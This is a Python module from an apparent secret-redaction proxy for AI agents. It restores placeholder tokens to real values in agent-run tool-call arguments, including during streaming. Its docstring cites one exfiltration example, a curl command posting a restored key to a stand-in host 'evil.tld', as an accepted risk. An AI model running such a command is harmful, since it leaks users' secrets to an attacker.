"""Inbound restore: placeholders in agent-run tool-call arguments become real values again, locally.

Only tool-call arguments for tools the AGENT runs are restored: Chat `tool_calls` (and legacy
`function_call`), Anthropic `tool_use`, Responses `function_call`, `custom_tool_call` and
`local_shell_call.action`. Server-side tool calls (`server_tool_use`, `mcp_tool_use`, `mcp_call`) run at
the upstream, so they keep their placeholders. The untrusted model's assistant text is never modified.

Restoring everything, including a malicious `curl evil.tld -d "<KEY_x>"`, is an accepted, documented
risk (see DECISIONS.md): narrowing restore would break real tasks.
"""
from __future__ import annotations

import copy
import json
import re
from typing import Any

from .ops import PLACEHOLDER_RE

# A trailing fragment that could still grow into a placeholder: "<", "<$", "<OR_KEY_", "<OR_KEY_30b6".
PARTIAL_RE = re.compile(r"<\$?(?:[A-Z][A-Z0-9_]*(?:[0-9a-f]{1,8})?)?\Z")
MAX_PLACEHOLDER = 96
MAX_ARGUMENT_CHARS = 8 * 1024 * 1024
AGENT_ANTHROPIC = {"tool_use"}
AGENT_RESPONSES = {"function_call", "custom_tool_call", "local_shell_call"}


class StreamLimitError(RuntimeError):
    pass


def restore_map(entities: list[dict[str, str]]) -> dict[str, str]:
    """{placeholder: real value} for both forms: <TOKEN> and <$TOKEN> (linked tokens restore to the root)."""
    table: dict[str, str] = {}
    for entity in entities:
        token, canonical = entity["token"], entity["canonical"]
        table[token] = canonical
        table[token.replace("<", "<$", 1)] = canonical
    return table


def restore_text(value: str, table: dict[str, str]) -> str:
    return PLACEHOLDER_RE.sub(lambda m: table.get(m.group(0), m.group(0)), value)


def restore_value(value: Any, table: dict[str, str]) -> Any:
    if isinstance(value, str):
        return restore_text(value, table)
    if isinstance(value, list):
        return [restore_value(v, table) for v in value]
    if isinstance(value, dict):
        return {k: restore_value(v, table) for k, v in value.items()}
    return value


def restore_arguments(arguments: str, table: dict[str, str]) -> str:
    """JSON arguments: restore decoded string values, then re-encode. Textual replacement into serialized
    JSON would corrupt quotes and Windows backslashes. Non-JSON arguments are restored as text."""
    if not isinstance(arguments, str):
        return arguments
    try:
        value = json.loads(arguments)
    except ValueError:
        return restore_text(arguments, table)
    restored = restore_value(value, table)
    return arguments if restored == value else json.dumps(restored, ensure_ascii=False)


def restore_response(data: dict[str, Any], table: dict[str, str]) -> dict[str, Any]:
    """A complete (non-streamed) upstream response, any of the three APIs."""
    output = copy.deepcopy(data)
    for choice in output.get("choices") or []:
        message = choice.get("message") or {}
        for call in message.get("tool_calls") or []:
            fn = call.get("function") or {}
            if isinstance(fn.get("arguments"), str):
                fn["arguments"] = restore_arguments(fn["arguments"], table)
        if isinstance(message.get("function_call"), dict):
            message["function_call"]["arguments"] = restore_arguments(message["function_call"].get("arguments", ""), table)
    for block in output.get("content") or []:
        if isinstance(block, dict) and block.get("type") in AGENT_ANTHROPIC:
            block["input"] = restore_value(block.get("input", {}), table)
    for item in output.get("output") or []:
        restore_responses_item(item, table)
    return output


def restore_responses_item(item: Any, table: dict[str, str]) -> None:
    if not isinstance(item, dict):
        return
    typ = item.get("type")
    if typ == "function_call":
        item["arguments"] = restore_arguments(item.get("arguments", ""), table)
    elif typ == "custom_tool_call":
        item["input"] = restore_text(item.get("input", ""), table)
    elif typ == "local_shell_call" and isinstance(item.get("action"), dict):
        item["action"] = restore_value(item["action"], table)


class ArgumentStream:
    """Restores one tool call's argument deltas as they stream.

    Everything is passed through immediately except a trailing fragment that could be the start of a
    placeholder (`<`, `<$`, `<TYPE_`, ...), held until the next delta decides it. In JSON mode the real
    value is inserted JSON-escaped, since deltas are fragments of a JSON document.
    """

    def __init__(self, table: dict[str, str], json_mode: bool) -> None:
        self.table = table
        self.json_mode = json_mode
        self.pending = ""
        self.total = 0

    def _value(self, placeholder: str) -> str:
        value = self.table.get(placeholder)
        if value is None:
            return placeholder
        return json.dumps(value, ensure_ascii=False)[1:-1] if self.json_mode else value

    def _restore(self, text: str) -> str:
        return PLACEHOLDER_RE.sub(lambda m: self._value(m.group(0)), text)

    def feed(self, delta: str) -> str:
        if not isinstance(delta, str):
            return delta
        self.total += len(delta)
        if self.total > MAX_ARGUMENT_CHARS:
            raise StreamLimitError(f"tool call arguments exceed {MAX_ARGUMENT_CHARS} characters")
        text = self.pending + delta
        cut = text.rfind("<")
        if cut != -1 and len(text) - cut <= MAX_PLACEHOLDER and PARTIAL_RE.match(text, cut):
            emit, self.pending = text[:cut], text[cut:]
        else:
            emit, self.pending = text, ""
        return self._restore(emit)

    def flush(self) -> str:
        rest, self.pending = self.pending, ""
        return self._restore(rest)
